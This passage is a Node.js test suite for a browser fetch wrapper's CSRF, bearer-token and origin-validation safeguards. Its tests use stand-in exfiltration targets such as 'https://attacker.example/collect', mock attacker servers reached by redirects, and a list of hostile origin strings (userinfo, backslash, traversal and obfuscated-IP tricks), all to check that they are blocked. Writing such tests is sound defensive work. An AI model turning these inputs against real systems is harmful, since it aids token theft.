import test from "node:test";
import assert from "node:assert/strict";
import http from "node:http";
import { once } from "node:events";

import {
  CSRF_BOOTSTRAP_PATH,
  CSRF_HEADER,
  REMOTE_API_ORIGIN_SESSION_KEY,
  REMOTE_AUTHORIZATION_SESSION_KEY,
  REMOTE_BEARER_SESSION_KEY,
  _resetCsrfCapabilityForTests,
  clearVibeComfyRemoteBearer,
  configureVibeComfyRemoteBearer,
  vibecomfyFetch,
} from "../../vibecomfy/comfy_nodes/web/http_security.js";

const TOKEN = "browser-test-process-csrf-capability-0000001";

function makeSessionStorage(entries = []) {
  const values = new Map(entries);
  return {
    values,
    getItem(key) {
      return values.has(key) ? values.get(key) : null;
    },
    setItem(key, value) {
      values.set(key, String(value));
    },
    removeItem(key) {
      values.delete(key);
    },
  };
}

function remoteAuthorizationRecord(bearer, apiOrigin) {
  return JSON.stringify({
    version: 1,
    api_origin: apiOrigin,
    bearer,
  });
}

function response(body, status = 200) {
  return {
    ok: status >= 200 && status < 300,
    status,
    async json() {
      return structuredClone(body);
    },
  };
}

async function readRequestBody(request) {
  const chunks = [];
  for await (const chunk of request) chunks.push(chunk);
  return Buffer.concat(chunks).toString("utf8");
}

async function startHttpServer(handler) {
  const server = http.createServer((request, response_) => {
    Promise.resolve(handler(request, response_)).catch((error) => {
      response_.statusCode = 500;
      response_.end(String(error));
    });
  });
  server.listen(0, "127.0.0.1");
  await once(server, "listening");
  const address = server.address();
  return {
    origin: `http://127.0.0.1:${address.port}`,
    async close() {
      await new Promise((resolve) => server.close(resolve));
    },
  };
}

test("mutating browser request bootstraps once and sends process CSRF header", async () => {
  _resetCsrfCapabilityForTests();
  const calls = [];
  const originalFetch = globalThis.fetch;
  globalThis.fetch = async (url, options = {}) => {
    calls.push({ url: String(url), options: structuredClone(options) });
    if (String(url) === CSRF_BOOTSTRAP_PATH) {
      return response({ csrf_header: CSRF_HEADER, csrf_token: TOKEN });
    }
    return response({ ok: true });
  };
  try {
    await vibecomfyFetch("/vibecomfy/agent/settings", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: "{}",
    });
    await vibecomfyFetch("/vibecomfy/agent/settings", { method: "POST" });

    assert.equal(calls.length, 3);
    assert.equal(calls[0].url, CSRF_BOOTSTRAP_PATH);
    assert.equal(calls[0].options.credentials, "same-origin");
    assert.equal(calls[0].options.cache, "no-store");
    assert.equal(calls[0].options.redirect, "error");
    assert.equal(calls[1].options.headers[CSRF_HEADER], TOKEN);
    assert.equal(calls[1].options.redirect, "error");
    assert.equal(calls[1].options.headers["Content-Type"], "application/json");
    assert.equal(calls[2].options.headers[CSRF_HEADER], TOKEN);
  } finally {
    globalThis.fetch = originalFetch;
  }
});

test("guarded GET uses same-origin credentials without requesting CSRF", async () => {
  _resetCsrfCapabilityForTests();
  const calls = [];
  const originalFetch = globalThis.fetch;
  globalThis.fetch = async (url, options = {}) => {
    calls.push({ url: String(url), options });
    return response({ ok: true });
  };
  try {
    await vibecomfyFetch("/vibecomfy/agent/status");

    assert.equal(calls.length, 1);
    assert.equal(calls[0].url, "/vibecomfy/agent/status");
    assert.equal(calls[0].options.credentials, "same-origin");
    assert.equal(calls[0].options.headers, undefined);
  } finally {
    globalThis.fetch = originalFetch;
  }
});

test("invalid bootstrap fails closed before mutating fetch", async () => {
  _resetCsrfCapabilityForTests();
  const calls = [];
  const originalFetch = globalThis.fetch;
  globalThis.fetch = async (url) => {
    calls.push(String(url));
    return response({ csrf_header: CSRF_HEADER, csrf_token: "short" });
  };
  try {
    await assert.rejects(
      vibecomfyFetch("/vibecomfy/node-packs/install", { method: "POST" }),
      /invalid capability/,
    );
    assert.deepEqual(calls, [CSRF_BOOTSTRAP_PATH]);
  } finally {
    globalThis.fetch = originalFetch;
  }
});

test("remote browser GET and mutation inject bearer without local bootstrap", async () => {
  _resetCsrfCapabilityForTests();
  const bearer = "remote-browser-test-capability-0123456789";
  const calls = [];
  const originalFetch = globalThis.fetch;
  const originalLocation = globalThis.location;
  globalThis.location = {
    href: "https://panel.example/app",
    hostname: "panel.example",
    origin: "https://panel.example",
  };
  globalThis.fetch = async (url, options = {}) => {
    calls.push({ url: String(url), options: structuredClone(options) });
    return response({ ok: true });
  };
  configureVibeComfyRemoteBearer(bearer);
  try {
    await vibecomfyFetch("/vibecomfy/agent/status");
    await vibecomfyFetch("/vibecomfy/agent/settings", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: "{}",
    });

    assert.equal(calls.length, 2);
    assert.deepEqual(calls.map((entry) => entry.url), [
      "https://panel.example/vibecomfy/agent/status",
      "https://panel.example/vibecomfy/agent/settings",
    ]);
    assert.equal(calls[0].options.headers.Authorization, `Bearer ${bearer}`);
    assert.equal(calls[1].options.headers.Authorization, `Bearer ${bearer}`);
    assert.equal(calls[1].options.headers[CSRF_HEADER], undefined);
    assert.equal(calls[0].options.credentials, "omit");
    assert.equal(calls[0].options.redirect, "error");
  } finally {
    clearVibeComfyRemoteBearer();
    globalThis.fetch = originalFetch;
    globalThis.location = originalLocation;
  }
});

test("remote browser without configured bearer fails before fetch without leakage", async () => {
  _resetCsrfCapabilityForTests();
  const calls = [];
  const originalFetch = globalThis.fetch;
  const originalLocation = globalThis.location;
  globalThis.location = {
    href: "https://panel.example/app",
    hostname: "panel.example",
    origin: "https://panel.example",
  };
  globalThis.fetch = async (...args) => {
    calls.push(args);
    return response({ ok: true });
  };
  try {
    await assert.rejects(
      vibecomfyFetch("/vibecomfy/agent/settings"),
      /not configured for this tab/,
    );
    assert.equal(calls.length, 0);
  } finally {
    globalThis.fetch = originalFetch;
    globalThis.location = originalLocation;
  }
});

test("remote bearer rejects a foreign absolute target before fetch without disclosure", async () => {
  _resetCsrfCapabilityForTests();
  const bearer = "foreign-origin-exfiltration-capability-0123456789";
  const calls = [];
  const originalFetch = globalThis.fetch;
  const originalLocation = globalThis.location;
  globalThis.location = {
    href: "https://panel.example/app",
    hostname: "panel.example",
    origin: "https://panel.example",
  };
  globalThis.fetch = async (...args) => {
    calls.push(args);
    return response({ ok: true });
  };
  configureVibeComfyRemoteBearer(bearer);
  try {
    let error;
    try {
      await vibecomfyFetch("https://attacker.example/collect");
    } catch (caught) {
      error = caught;
    }
    assert.match(error?.message, /not the configured API origin/);
    assert.equal(calls.length, 0);
    assert.equal(error.message.includes(bearer), false);
    assert.equal(error.message.includes("attacker.example"), false);
  } finally {
    clearVibeComfyRemoteBearer();
    globalThis.fetch = originalFetch;
    globalThis.location = originalLocation;
  }
});

test("remote URL objects execute only the exact validated configured target", async () => {
  _resetCsrfCapabilityForTests();
  const bearer = "url-object-remote-capability-0123456789";
  const calls = [];
  const originalFetch = globalThis.fetch;
  const originalLocation = globalThis.location;
  globalThis.location = {
    href: "https://panel.example/app",
    hostname: "panel.example",
    origin: "https://panel.example",
  };
  globalThis.fetch = async (url, options = {}) => {
    calls.push({ url: String(url), options: structuredClone(options) });
    return response({ ok: true });
  };
  configureVibeComfyRemoteBearer(bearer, {
    apiOrigin: "https://api.example",
  });
  try {
    let foreignError;
    try {
      await vibecomfyFetch(new URL("https://attacker.example/collect"));
    } catch (caught) {
      foreignError = caught;
    }
    assert.match(foreignError?.message, /not the configured API origin/);
    assert.equal(foreignError.message.includes(bearer), false);
    assert.equal(foreignError.message.includes("attacker.example"), false);
    assert.equal(calls.length, 0);

    const configured = new URL("https://api.example/vibecomfy/agent/status");
    await vibecomfyFetch(configured);
    assert.equal(calls.length, 1);
    assert.equal(calls[0].url, configured.href);
    assert.equal(calls[0].options.headers.Authorization, `Bearer ${bearer}`);
  } finally {
    clearVibeComfyRemoteBearer();
    globalThis.fetch = originalFetch;
    globalThis.location = originalLocation;
  }
});

test("local foreign URL object fails before CSRF bootstrap or attacker fetch", async () => {
  _resetCsrfCapabilityForTests();
  const calls = [];
  const originalFetch = globalThis.fetch;
  const originalLocation = globalThis.location;
  const originalSessionStorage = globalThis.sessionStorage;
  globalThis.location = {
    href: "http://localhost:8188/app",
    hostname: "localhost",
    origin: "http://localhost:8188",
  };
  globalThis.sessionStorage = makeSessionStorage();
  globalThis.fetch = async (...args) => {
    calls.push(args);
    return response({ ok: true });
  };
  try {
    await assert.rejects(
      vibecomfyFetch(new URL("https://attacker.example/collect"), {
        method: "POST",
      }),
      /not configured for this tab/,
    );
    assert.equal(calls.length, 0);
  } finally {
    _resetCsrfCapabilityForTests();
    globalThis.fetch = originalFetch;
    globalThis.location = originalLocation;
    globalThis.sessionStorage = originalSessionStorage;
  }
});

test("local same-origin URL object uses its validated target and CSRF", async () => {
  _resetCsrfCapabilityForTests();
  const calls = [];
  const originalFetch = globalThis.fetch;
  const originalLocation = globalThis.location;
  const originalSessionStorage = globalThis.sessionStorage;
  globalThis.location = {
    href: "http://localhost:8188/app",
    hostname: "localhost",
    origin: "http://localhost:8188",
  };
  globalThis.sessionStorage = makeSessionStorage();
  globalThis.fetch = async (url, options = {}) => {
    calls.push({ url: String(url), options: structuredClone(options) });
    if (String(url) === CSRF_BOOTSTRAP_PATH) {
      return response({ csrf_header: CSRF_HEADER, csrf_token: TOKEN });
    }
    return response({ ok: true });
  };
  const target = new URL("http://localhost:8188/vibecomfy/agent/settings");
  try {
    await vibecomfyFetch(target, { method: "POST" });
    assert.equal(calls.length, 2);
    assert.equal(calls[0].url, CSRF_BOOTSTRAP_PATH);
    assert.equal(calls[1].url, target.href);
    assert.equal(calls[1].options.headers[CSRF_HEADER], TOKEN);
    assert.equal(calls[1].options.headers.Authorization, undefined);
  } finally {
    _resetCsrfCapabilityForTests();
    globalThis.fetch = originalFetch;
    globalThis.location = originalLocation;
    globalThis.sessionStorage = originalSessionStorage;
  }
});

test("live local mutation redirect sends CSRF and body only to the validated origin", async () => {
  _resetCsrfCapabilityForTests();
  const attackerRequests = [];
  const originRequests = [];
  const attacker = await startHttpServer(async (request, response_) => {
    attackerRequests.push({
      headers: { ...request.headers },
      body: await readRequestBody(request),
    });
    response_.end("unexpected redirect hop");
  });
  const origin = await startHttpServer(async (request, response_) => {
    const body = await readRequestBody(request);
    originRequests.push({ url: request.url, headers: { ...request.headers }, body });
    if (request.url === CSRF_BOOTSTRAP_PATH) {
      response_.setHeader("Content-Type", "application/json");
      response_.end(JSON.stringify({ csrf_header: CSRF_HEADER, csrf_token: TOKEN }));
      return;
    }
    response_.statusCode = 302;
    response_.setHeader("Location", `${attacker.origin}/collect-local`);
    response_.end();
  });
  const nativeFetch = globalThis.fetch;
  const originalLocation = globalThis.location;
  const originalSessionStorage = globalThis.sessionStorage;
  globalThis.location = {
    href: `${origin.origin}/app`,
    hostname: "127.0.0.1",
    origin: origin.origin,
  };
  globalThis.sessionStorage = makeSessionStorage();
  globalThis.fetch = (input, init) => nativeFetch(
    new URL(String(input), globalThis.location.href),
    init,
  );
  const body = JSON.stringify({ secret: "local-body-must-not-redirect" });
  try {
    await assert.rejects(
      vibecomfyFetch("/vibecomfy/agent/settings", {
        method: "POST",
        redirect: "follow",
        headers: { "Content-Type": "application/json" },
        body,
      }),
    );
    await new Promise((resolve) => setImmediate(resolve));
    assert.deepEqual(originRequests.map((entry) => entry.url), [
      CSRF_BOOTSTRAP_PATH,
      "/vibecomfy/agent/settings",
    ]);
    assert.equal(originRequests[1].headers[CSRF_HEADER.toLowerCase()], TOKEN);
    assert.equal(originRequests[1].headers.authorization, undefined);
    assert.equal(originRequests[1].body, body);
    assert.equal(attackerRequests.length, 0);
  } finally {
    _resetCsrfCapabilityForTests();
    globalThis.fetch = nativeFetch;
    globalThis.location = originalLocation;
    globalThis.sessionStorage = originalSessionStorage;
    await origin.close();
    await attacker.close();
  }
});

test("live remote redirect sends bearer and body only to the configured origin", async () => {
  _resetCsrfCapabilityForTests();
  const bearer = "live-remote-redirect-capability-0123456789";
  const attackerRequests = [];
  const originRequests = [];
  const attacker = await startHttpServer(async (request, response_) => {
    attackerRequests.push({
      headers: { ...request.headers },
      body: await readRequestBody(request),
    });
    response_.end("unexpected redirect hop");
  });
  const origin = await startHttpServer(async (request, response_) => {
    originRequests.push({
      url: request.url,
      headers: { ...request.headers },
      body: await readRequestBody(request),
    });
    response_.statusCode = 307;
    response_.setHeader("Location", `${attacker.origin}/collect-remote`);
    response_.end();
  });
  const nativeFetch = globalThis.fetch;
  const originalLocation = globalThis.location;
  const originalSessionStorage = globalThis.sessionStorage;
  globalThis.location = {
    href: `${origin.origin}/app`,
    hostname: "127.0.0.1",
    origin: origin.origin,
  };
  globalThis.sessionStorage = makeSessionStorage();
  globalThis.fetch = (input, init) => nativeFetch(input, init);
  configureVibeComfyRemoteBearer(bearer, { apiOrigin: origin.origin });
  const body = JSON.stringify({ secret: "remote-body-must-not-redirect" });
  try {
    await assert.rejects(
      vibecomfyFetch("/vibecomfy/agent/settings", {
        method: "POST",
        redirect: "follow",
        headers: { "Content-Type": "application/json" },
        body,
      }),
    );
    await new Promise((resolve) => setImmediate(resolve));
    assert.equal(originRequests.length, 1);
    assert.equal(originRequests[0].url, "/vibecomfy/agent/settings");
    assert.equal(originRequests[0].headers.authorization, `Bearer ${bearer}`);
    assert.equal(originRequests[0].headers[CSRF_HEADER.toLowerCase()], undefined);
    assert.equal(originRequests[0].body, body);
    assert.equal(attackerRequests.length, 0);
  } finally {
    clearVibeComfyRemoteBearer();
    globalThis.fetch = nativeFetch;
    globalThis.location = originalLocation;
    globalThis.sessionStorage = originalSessionStorage;
    await origin.close();
    await attacker.close();
  }
});

test("live CSRF bootstrap redirect stops before mutation or second origin", async () => {
  _resetCsrfCapabilityForTests();
  const attackerRequests = [];
  const originRequests = [];
  const attacker = await startHttpServer(async (request, response_) => {
    attackerRequests.push({
      headers: { ...request.headers },
      body: await readRequestBody(request),
    });
    response_.end("unexpected redirect hop");
  });
  const origin = await startHttpServer(async (request, response_) => {
    originRequests.push({
      url: request.url,
      headers: { ...request.headers },
      body: await readRequestBody(request),
    });
    response_.statusCode = 303;
    response_.setHeader("Location", `${attacker.origin}/collect-bootstrap`);
    response_.end();
  });
  const nativeFetch = globalThis.fetch;
  const originalLocation = globalThis.location;
  const originalSessionStorage = globalThis.sessionStorage;
  globalThis.location = {
    href: `${origin.origin}/app`,
    hostname: "127.0.0.1",
    origin: origin.origin,
  };
  globalThis.sessionStorage = makeSessionStorage();
  globalThis.fetch = (input, init) => nativeFetch(
    new URL(String(input), globalThis.location.href),
    init,
  );
  try {
    await assert.rejects(
      vibecomfyFetch("/vibecomfy/agent/settings", {
        method: "POST",
        redirect: "follow",
        body: "mutation-body-never-sent",
      }),
    );
    await new Promise((resolve) => setImmediate(resolve));
    assert.equal(originRequests.length, 1);
    assert.equal(originRequests[0].url, CSRF_BOOTSTRAP_PATH);
    assert.equal(originRequests[0].headers[CSRF_HEADER.toLowerCase()], undefined);
    assert.equal(originRequests[0].headers.authorization, undefined);
    assert.equal(originRequests[0].body, "");
    assert.equal(attackerRequests.length, 0);
  } finally {
    _resetCsrfCapabilityForTests();
    globalThis.fetch = nativeFetch;
    globalThis.location = originalLocation;
    globalThis.sessionStorage = originalSessionStorage;
    await origin.close();
    await attacker.close();
  }
});

test("Request arbitrary getter coercion and cross-realm-looking inputs are rejected", async () => {
  _resetCsrfCapabilityForTests();
  const bearer = "unsupported-input-capability-0123456789";
  const calls = [];
  let getterCalls = 0;
  let toStringCalls = 0;
  const originalFetch = globalThis.fetch;
  const originalLocation = globalThis.location;
  globalThis.location = {
    href: "https://panel.example/app",
    hostname: "panel.example",
    origin: "https://panel.example",
  };
  globalThis.fetch = async (...args) => {
    calls.push(args);
    return response({ ok: true });
  };
  configureVibeComfyRemoteBearer(bearer);
  const getterShape = {};
  for (const property of ["url", "method", "headers"]) {
    Object.defineProperty(getterShape, property, {
      get() {
        getterCalls += 1;
        return "https://panel.example/vibecomfy/agent/status";
      },
    });
  }
  const unsupported = [
    { url: "https://panel.example/vibecomfy/agent/status" },
    getterShape,
    {
      toString() {
        toStringCalls += 1;
        return "https://panel.example/vibecomfy/agent/status";
      },
    },
    {
      href: "https://panel.example/vibecomfy/agent/status",
      [Symbol.toStringTag]: "URL",
    },
    Object.create(URL.prototype),
  ];
  if (typeof Request === "function") {
    unsupported.push(new Request("https://panel.example/vibecomfy/agent/status"));
  }
  try {
    for (const input of unsupported) {
      await assert.rejects(
        vibecomfyFetch(input),
        /input type is not supported/,
      );
    }
    assert.equal(getterCalls, 0);
    assert.equal(toStringCalls, 0);
    assert.equal(calls.length, 0);
  } finally {
    clearVibeComfyRemoteBearer();
    globalThis.fetch = originalFetch;
    globalThis.location = originalLocation;
  }
});

test("native URL extraction ignores an overridden href getter", async () => {
  _resetCsrfCapabilityForTests();
  const bearer = "native-url-getter-capability-0123456789";
  const calls = [];
  let getterCalls = 0;
  const originalFetch = globalThis.fetch;
  const originalLocation = globalThis.location;
  globalThis.location = {
    href: "https://panel.example/app",
    hostname: "panel.example",
    origin: "https://panel.example",
  };
  globalThis.fetch = async (url, options = {}) => {
    calls.push({ url: String(url), options: structuredClone(options) });
    return response({ ok: true });
  };
  configureVibeComfyRemoteBearer(bearer);
  const target = new URL("https://panel.example/vibecomfy/agent/status");
  Object.defineProperty(target, "href", {
    get() {
      getterCalls += 1;
      return "https://attacker.example/collect";
    },
  });
  try {
    await vibecomfyFetch(target);
    assert.equal(getterCalls, 0);
    assert.equal(calls.length, 1);
    assert.equal(calls[0].url, "https://panel.example/vibecomfy/agent/status");
    assert.equal(calls[0].options.headers.Authorization, `Bearer ${bearer}`);
  } finally {
    clearVibeComfyRemoteBearer();
    globalThis.fetch = originalFetch;
    globalThis.location = originalLocation;
  }
});

test("remote bearer may target only a separately configured API origin", async () => {
  _resetCsrfCapabilityForTests();
  const bearer = "configured-api-origin-capability-0123456789";
  const calls = [];
  const originalFetch = globalThis.fetch;
  const originalLocation = globalThis.location;
  globalThis.location = {
    href: "https://panel.example/app",
    hostname: "panel.example",
    origin: "https://panel.example",
  };
  globalThis.fetch = async (url, options = {}) => {
    calls.push({ url: String(url), options: structuredClone(options) });
    return response({ ok: true });
  };
  configureVibeComfyRemoteBearer(bearer, {
    apiOrigin: "https://api.example",
  });
  try {
    await vibecomfyFetch("/vibecomfy/agent/status");
    await vibecomfyFetch("/vibecomfy/agent/settings", { method: "POST" });
    assert.equal(calls.length, 2);
    assert.deepEqual(calls.map((entry) => entry.url), [
      "https://api.example/vibecomfy/agent/status",
      "https://api.example/vibecomfy/agent/settings",
    ]);
    assert.equal(calls[0].options.headers.Authorization, `Bearer ${bearer}`);
    assert.equal(calls[0].options.credentials, "omit");
    assert.equal(calls[1].options.headers.Authorization, `Bearer ${bearer}`);
    assert.equal(calls[1].options.headers[CSRF_HEADER], undefined);
  } finally {
    clearVibeComfyRemoteBearer();
    globalThis.fetch = originalFetch;
    globalThis.location = originalLocation;
  }
});

test("raw API origin hostile forms fail before fetch for memory and persisted records", async () => {
  const bearer = "raw-origin-hostile-capability-0123456789";
  const originalFetch = globalThis.fetch;
  const originalLocation = globalThis.location;
  const originalSessionStorage = globalThis.sessionStorage;
  const calls = [];
  globalThis.location = {
    href: "http://localhost:8188/app",
    hostname: "localhost",
    origin: "http://localhost:8188",
  };
  globalThis.fetch = async (...args) => {
    calls.push(args);
    return response({ ok: true });
  };
  const hostileOrigins = [
    " https://api.example",
    "https://api.example ",
    "https://api.exa\tmple",
    "https://api.exa\nmple",
    "https://api.exa\rmple",
    "https://api.exa mple",
    "https://api.example:",
    "http://127.0.0.1:",
    "http://[::1]:",
    "https://api.example:0",
    "https://api.example:65536",
    "https://api.example:+443",
    "https://user@api.example",
    "https://user:password@api.example",
    "https:\\api.example",
    "https://api.example\\@attacker.example",
    "https://api.example/path",
    "https://api.example/.",
    "https://api.example/foo/..",
    "https://api.example/%2e",
    "https://api.example/../other",
    "https://api.example/%2e%2e/other",
    "https://api.example?query=1",
    "https://api.example#fragment",
    "ftp://api.example",
    "//api.example",
    "https://",
    "https:///missing-host",
    "https://127.1",
    "https://127.000.000.001",
    "https://0x7f000001",
    "https://api..example",
    "https://-api.example",
    "https://api-.example",
    "https://api_name.example",
    "https://bücher.example",
  ];
  try {
    for (const apiOrigin of hostileOrigins) {
      _resetCsrfCapabilityForTests();
      globalThis.sessionStorage = makeSessionStorage();
      let memoryError;
      try {
        configureVibeComfyRemoteBearer(bearer, { apiOrigin });
      } catch (caught) {
        memoryError = caught;
      }
      assert.match(memoryError?.message, /not configured safely/);
      assert.equal(memoryError.message.includes(bearer), false);
      assert.equal(memoryError.message.includes(apiOrigin), false);

      _resetCsrfCapabilityForTests();
      globalThis.sessionStorage = makeSessionStorage([
        [
          REMOTE_AUTHORIZATION_SESSION_KEY,
          remoteAuthorizationRecord(bearer, apiOrigin),
        ],
      ]);
      let persistedError;
      try {
        await vibecomfyFetch("/vibecomfy/agent/status");
      } catch (caught) {
        persistedError = caught;
      }
      assert.match(persistedError?.message, /not configured safely/);
      assert.equal(persistedError.message.includes(bearer), false);
      assert.equal(persistedError.message.includes(apiOrigin), false);
    }
    assert.equal(calls.length, 0);
  } finally {
    _resetCsrfCapabilityForTests();
    globalThis.fetch = originalFetch;
    globalThis.location = originalLocation;
    globalThis.sessionStorage = originalSessionStorage;
  }
});

test("strict raw API origin accepts canonical hostname IPv4 IPv6 and punycode", async () => {
  const bearer = "raw-origin-valid-capability-0123456789";
  const originalFetch = globalThis.fetch;
  const originalLocation = globalThis.location;
  const originalSessionStorage = globalThis.sessionStorage;
  globalThis.location = {
    href: "http://localhost:8188/app",
    hostname: "localhost",
    origin: "http://localhost:8188",
  };
  const validOrigins = [
    ["HTTPS://API.Example:443/", "https://api.example"],
    ["http://127.0.0.1:8188", "http://127.0.0.1:8188"],
    ["http://[0:0:0:0:0:0:0:1]:8188/", "http://[::1]:8188"],
    ["https://xn--bcher-kva.example", "https://xn--bcher-kva.example"],
    ["http://localhost:80", "http://localhost"],
  ];
  try {
    for (const [apiOrigin, expectedOrigin] of validOrigins) {
      for (const source of ["memory", "persisted"]) {
        _resetCsrfCapabilityForTests();
        globalThis.sessionStorage = source === "persisted"
          ? makeSessionStorage([[
            REMOTE_AUTHORIZATION_SESSION_KEY,
            remoteAuthorizationRecord(bearer, apiOrigin),
          ]])
          : makeSessionStorage();
        if (source === "memory") {
          configureVibeComfyRemoteBearer(bearer, { apiOrigin });
        }
        const calls = [];
        globalThis.fetch = async (url, options = {}) => {
          calls.push({ url: String(url), options: structuredClone(options) });
          return response({ ok: true });
        };
        await vibecomfyFetch("/vibecomfy/agent/status");
        assert.equal(calls.length, 1);
        assert.equal(calls[0].url, `${expectedOrigin}/vibecomfy/agent/status`);
        assert.equal(calls[0].options.headers.Authorization, `Bearer ${bearer}`);
      }
    }
  } finally {
    _resetCsrfCapabilityForTests();
    globalThis.fetch = originalFetch;
    globalThis.location = originalLocation;
    globalThis.sessionStorage = originalSessionStorage;
  }
});

test("explicit API origin overrides loopback local mode for relative guarded requests", async () => {
  _resetCsrfCapabilityForTests();
  const bearer = "loopback-explicit-remote-capability-0123456789";
  const calls = [];
  const originalFetch = globalThis.fetch;
  const originalLocation = globalThis.location;
  globalThis.location = {
    href: "http://127.0.0.1:8188/app",
    hostname: "127.0.0.1",
    origin: "http://127.0.0.1:8188",
  };
  globalThis.fetch = async (url, options = {}) => {
    calls.push({ url: String(url), options: structuredClone(options) });
    return response({ ok: true });
  };
  configureVibeComfyRemoteBearer(bearer, {
    apiOrigin: "https://api.example",
  });
  try {
    await vibecomfyFetch("/vibecomfy/agent/status");
    await vibecomfyFetch("/vibecomfy/agent/settings", { method: "POST" });
    assert.equal(calls.length, 2);
    assert.deepEqual(calls.map((entry) => entry.url), [
      "https://api.example/vibecomfy/agent/status",
      "https://api.example/vibecomfy/agent/settings",
    ]);
    for (const call of calls) {
      assert.equal(call.options.credentials, "omit");
      assert.equal(call.options.headers.Authorization, `Bearer ${bearer}`);
      assert.equal(call.options.headers[CSRF_HEADER], undefined);
    }
  } finally {
    clearVibeComfyRemoteBearer();
    globalThis.fetch = originalFetch;
    globalThis.location = originalLocation;
  }
});

test("legacy split authorization is never combined or rebound to panel origin", async () => {
  const bearer = "persisted-remote-capability-0123456789";
  const originalFetch = globalThis.fetch;
  const originalLocation = globalThis.location;
  const originalSessionStorage = globalThis.sessionStorage;
  const calls = [];
  globalThis.location = {
    href: "http://localhost:8188/app",
    hostname: "localhost",
    origin: "http://localhost:8188",
  };
  globalThis.fetch = async (...args) => {
    calls.push(args);
    return response({ ok: true });
  };
  const invalidConfigurations = [
    [[REMOTE_BEARER_SESSION_KEY, bearer]],
    [[REMOTE_API_ORIGIN_SESSION_KEY, "https://api.example"]],
    [
      [REMOTE_BEARER_SESSION_KEY, bearer],
      [REMOTE_API_ORIGIN_SESSION_KEY, "https://api.example/path-not-origin"],
    ],
  ];
  try {
    for (const entries of invalidConfigurations) {
      _resetCsrfCapabilityForTests();
      globalThis.sessionStorage = makeSessionStorage(entries);
      let error;
      try {
        await vibecomfyFetch("/vibecomfy/agent/status");
      } catch (caught) {
        error = caught;
      }
      assert.match(
        error?.message,
        /legacy remote authorization/,
      );
      assert.equal(error.message.includes(bearer), false);
    }
    assert.equal(calls.length, 0);
  } finally {
    _resetCsrfCapabilityForTests();
    globalThis.fetch = originalFetch;
    globalThis.location = originalLocation;
    globalThis.sessionStorage = originalSessionStorage;
  }
});

test("complete persisted remote authority overrides loopback local mode", async () => {
  _resetCsrfCapabilityForTests();
  const bearer = "complete-persisted-capability-0123456789";
  const calls = [];
  const originalFetch = globalThis.fetch;
  const originalLocation = globalThis.location;
  const originalSessionStorage = globalThis.sessionStorage;
  globalThis.location = {
    href: "http://localhost:8188/app",
    hostname: "localhost",
    origin: "http://localhost:8188",
  };
  globalThis.sessionStorage = makeSessionStorage([
    [
      REMOTE_AUTHORIZATION_SESSION_KEY,
      remoteAuthorizationRecord(bearer, "https://api.example"),
    ],
  ]);
  globalThis.fetch = async (url, options = {}) => {
    calls.push({ url: String(url), options: structuredClone(options) });
    return response({ ok: true });
  };
  try {
    await vibecomfyFetch("/vibecomfy/agent/status");
    assert.equal(calls.length, 1);
    assert.equal(calls[0].url, "https://api.example/vibecomfy/agent/status");
    assert.equal(calls[0].options.headers.Authorization, `Bearer ${bearer}`);
  } finally {
    _resetCsrfCapabilityForTests();
    globalThis.fetch = originalFetch;
    globalThis.location = originalLocation;
    globalThis.sessionStorage = originalSessionStorage;
  }
});

test("unavailable tab storage preserves unconfigured loopback CSRF mode", async () => {
  _resetCsrfCapabilityForTests();
  const calls = [];
  const originalFetch = globalThis.fetch;
  const originalLocation = globalThis.location;
  const originalSessionStorage = globalThis.sessionStorage;
  globalThis.location = {
    href: "http://localhost:8188/app",
    hostname: "localhost",
    origin: "http://localhost:8188",
  };
  globalThis.sessionStorage = {
    getItem() {
      throw new Error("storage disabled");
    },
  };
  globalThis.fetch = async (url, options = {}) => {
    calls.push({ url: String(url), options: structuredClone(options) });
    if (String(url) === CSRF_BOOTSTRAP_PATH) {
      return response({ csrf_header: CSRF_HEADER, csrf_token: TOKEN });
    }
    return response({ ok: true });
  };
  try {
    await vibecomfyFetch("/vibecomfy/agent/settings", { method: "POST" });
    assert.equal(calls.length, 2);
    assert.equal(calls[0].url, CSRF_BOOTSTRAP_PATH);
    assert.equal(
      calls[1].url,
      "http://localhost:8188/vibecomfy/agent/settings",
    );
    assert.equal(calls[1].options.headers[CSRF_HEADER], TOKEN);
    assert.equal(calls[1].options.headers.Authorization, undefined);
  } finally {
    _resetCsrfCapabilityForTests();
    globalThis.fetch = originalFetch;
    globalThis.location = originalLocation;
    globalThis.sessionStorage = originalSessionStorage;
  }
});

test("corrupt versioned records fail before fetch without credential disclosure", async () => {
  const bearer = "corrupt-record-capability-0123456789";
  const originalFetch = globalThis.fetch;
  const originalLocation = globalThis.location;
  const originalSessionStorage = globalThis.sessionStorage;
  const calls = [];
  globalThis.location = {
    href: "http://localhost:8188/app",
    hostname: "localhost",
    origin: "http://localhost:8188",
  };
  globalThis.fetch = async (...args) => {
    calls.push(args);
    return response({ ok: true });
  };
  const corruptRecords = [
    "{",
    JSON.stringify({ version: 2, api_origin: "https://api.example", bearer }),
    JSON.stringify({ version: 1, api_origin: "https://api.example" }),
    JSON.stringify({
      version: 1,
      api_origin: "https://api.example/path",
      bearer,
    }),
    JSON.stringify({
      version: 1,
      api_origin: "https://api.example",
      bearer,
      unexpected: true,
    }),
  ];
  try {
    for (const serialized of corruptRecords) {
      _resetCsrfCapabilityForTests();
      globalThis.sessionStorage = makeSessionStorage([
        [REMOTE_AUTHORIZATION_SESSION_KEY, serialized],
      ]);
      let error;
      try {
        await vibecomfyFetch("/vibecomfy/agent/status");
      } catch (caught) {
        error = caught;
      }
      assert.match(error?.message, /persisted remote authorization|remote API origin/);
      assert.equal(error.message.includes(bearer), false);
    }
    assert.equal(calls.length, 0);
  } finally {
    _resetCsrfCapabilityForTests();
    globalThis.fetch = originalFetch;
    globalThis.location = originalLocation;
    globalThis.sessionStorage = originalSessionStorage;
  }
});

test("single-record write interruption exposes only old, new, or invalid state", async () => {
  const oldBearer = "old-atomic-record-capability-0123456789";
  const newBearer = "new-atomic-record-capability-0123456789";
  const originalFetch = globalThis.fetch;
  const originalLocation = globalThis.location;
  const originalSessionStorage = globalThis.sessionStorage;
  globalThis.location = {
    href: "http://localhost:8188/app",
    hostname: "localhost",
    origin: "http://localhost:8188",
  };
  const cases = [
    { mode: "throw-before", expected: "old" },
    { mode: "throw-after", expected: "new" },
    { mode: "corrupt-then-throw", expected: "invalid" },
    { mode: "success", expected: "new" },
  ];
  try {
    for (const { mode, expected } of cases) {
      _resetCsrfCapabilityForTests();
      const storage = makeSessionStorage([
        [
          REMOTE_AUTHORIZATION_SESSION_KEY,
